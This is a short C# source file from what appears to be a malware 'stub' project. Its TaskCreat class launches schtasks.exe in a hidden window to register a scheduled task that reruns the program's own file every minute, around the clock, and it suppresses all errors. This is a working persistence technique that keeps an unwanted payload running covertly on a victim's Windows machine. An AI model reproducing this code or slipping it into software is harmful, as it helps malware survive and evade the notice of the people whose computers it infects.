using Stub.Help;
using System;
using System.Diagnostics;

namespace Stub.Startup
{
    class TaskCreat
    {
        public static void Set()
        {
            if (Config.autoRun_Scheduler)
            {
                string taskArguments = CreateTaskArguments();
                StartScheduledTask(taskArguments);
            }
        }
        private static string CreateTaskArguments()
        {
            string taskTime = DateTime.Now.AddMinutes(1.0).ToString("HH:mm");
            return $"/create /tn {Config.taskName} /tr \"{StringHelper.WorkFile.FullName}\" /st {taskTime} /du 23:59 /sc daily /ri 1 /f";
        }
        private static void StartScheduledTask(string arguments)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "schtasks.exe",
                    RedirectStandardOutput = true,
                    UseShellExecute = false
                });
            }
            catch {}
        }
    }

}
